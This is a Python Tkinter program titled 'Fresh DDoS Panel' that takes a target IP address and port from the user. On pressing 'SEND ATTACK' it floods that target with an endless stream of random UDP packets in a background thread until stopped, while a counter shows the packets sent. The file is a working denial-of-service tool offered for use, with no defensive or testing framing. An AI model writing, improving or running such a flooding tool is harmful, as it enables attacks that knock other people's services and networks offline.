import tkinter as tk
from tkinter import messagebox
from PIL import ImageTk, Image
import socket
import random
import threading

START_COLOR = "#006400"
END_COLOR = "#ADFF2F"
TEXT_COLOR = "black"
BUTTON_COLOR = "black"
BUTTON_TEXT_COLOR = "white"

attack_thread = None
stop_attack_flag = False

def start_attack():
    ip = ip_entry.get()
    port = port_entry.get()

    if not ip or not port:
        messagebox.showerror("Erreur", "Veuillez entrer une IP et un port.")
        return
    
    try:
        port = int(port)
    except ValueError:
        messagebox.showerror("Erreur", "Le port doit être un nombre entier.")
        return

    switch_to_attack_interface()

    def attack():
        global stop_attack_flag
        stop_attack_flag = False

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        num_packets = 5000
        
        packets_sent = 0

        while not stop_attack_flag:
            for i in range(num_packets):
                payload = str(random.randint(0, 100000000)).encode()
                try:
                    client_socket.sendto(payload, (ip, port))
                except Exception as e:
                    messagebox.showerror("Erreur", f"Erreur lors de l'envoi du paquet {i}: {e}")
                    client_socket.close()
                    return

                if i % 100 == 0:
                    packets_sent += 100
                    packets_sent_label.config(text=f"Packets Sent: {packets_sent}")
            
        client_socket.close()

    global attack_thread
    attack_thread = threading.Thread(target=attack)
    attack_thread.start()

def stop_attack():
    global stop_attack_flag
    stop_attack_flag = True
    stop_button.place_forget()
    back_button.place(x=250, y=400)

def switch_to_attack_interface():
    ip_label.place_forget()
    ip_entry.place_forget()
    port_label.place_forget()
    port_entry.place_forget()
    start_button.place_forget()

    packets_sent_label.place(x=200, y=280)
    stop_button.place(x=250, y=350)

def switch_to_initial_interface():
    global attack_thread
    if attack_thread is not None:
        attack_thread.join()

    packets_sent_label.place_forget()
    stop_button.place_forget()
    back_button.place_forget()

    ip_label.place(x=200, y=250)
    ip_entry.place(x=200, y=280)
    port_label.place(x=200, y=320)
    port_entry.place(x=200, y=350)
    start_button.place(x=250, y=400)

def rgb_to_hex(r, g, b):
    return f'#{r:02x}{g:02x}{b:02x}'

def interpolate_color(start_color, end_color, factor):
    r1, g1, b1 = start_color
    r2, g2, b2 = end_color
    r = int(r1 + (r2 - r1) * factor)
    g = int(g1 + (g2 - g1) * factor)
    b = int(b1 + (b2 - b1) * factor)
    return r, g, b

def create_gradient(canvas, width, height, start_color, end_color):
    start_color_rgb = canvas.winfo_rgb(start_color)
    end_color_rgb = canvas.winfo_rgb(end_color)

    start_color_rgb = (start_color_rgb[0] // 256, start_color_rgb[1] // 256, start_color_rgb[2] // 256)
    end_color_rgb = (end_color_rgb[0] // 256, end_color_rgb[1] // 256, end_color_rgb[2] // 256)

    for i in range(height):
        factor = i / height
        color = interpolate_color(start_color_rgb, end_color_rgb, factor)
        color_hex = rgb_to_hex(*color)
        canvas.create_line(0, i, width, i, fill=color_hex)

root = tk.Tk()
root.title("Fresh DDoS Panel")
root.geometry("600x700")

canvas = tk.Canvas(root, width=600, height=700)
canvas.pack(fill="both", expand=True)

create_gradient(canvas, 600, 700, START_COLOR, END_COLOR)

image_path = "fresh logo.png"
try:
    img = Image.open(image_path)
    img = img.resize((200, 200), Image.LANCZOS)
    img = ImageTk.PhotoImage(img)
    panel = tk.Label(root, image=img, bg=START_COLOR)
    panel.place(x=200, y=10)
except Exception as e:
    print(f"Image loading failed: {e}")

ip_label = tk.Label(root, text="IP ADDRESS:", font=("Helvetica", 12), bg=START_COLOR, fg=TEXT_COLOR)
ip_entry = tk.Entry(root, width=30)

port_label = tk.Label(root, text="PORT:", font=("Helvetica", 12), bg=START_COLOR, fg=TEXT_COLOR)
port_entry = tk.Entry(root, width=30)

start_button = tk.Button(root, text="SEND ATTACK", command=start_attack, bg=BUTTON_COLOR, fg=BUTTON_TEXT_COLOR)

packets_sent_label = tk.Label(root, text="Packets Sent: 0", font=("Helvetica", 12), bg=START_COLOR, fg=TEXT_COLOR)

stop_button = tk.Button(root, text="STOP ATTACK", command=stop_attack, bg=BUTTON_COLOR, fg=BUTTON_TEXT_COLOR)

back_button = tk.Button(root, text="BACK", command=switch_to_initial_interface, bg=BUTTON_COLOR, fg=BUTTON_TEXT_COLOR)

ip_label.place(x=200, y=250)
ip_entry.place(x=200, y=280)
port_label.place(x=200, y=320)
port_entry.place(x=200, y=350)
start_button.place(x=250, y=400)

root.mainloop()